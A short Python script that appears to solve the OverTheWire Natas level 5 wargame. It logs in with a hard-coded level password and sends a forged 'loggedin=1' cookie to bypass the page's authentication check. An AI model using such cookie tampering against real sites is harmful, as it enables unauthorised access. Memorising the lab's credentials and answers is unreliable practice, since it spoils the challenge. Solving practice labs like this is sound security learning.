import requests

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

cookies = {"loggedin": "1"}

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
response = session.get(url, auth=(username, password), cookies=cookies)
content = response.text

print(content)
# print(session.cookies)
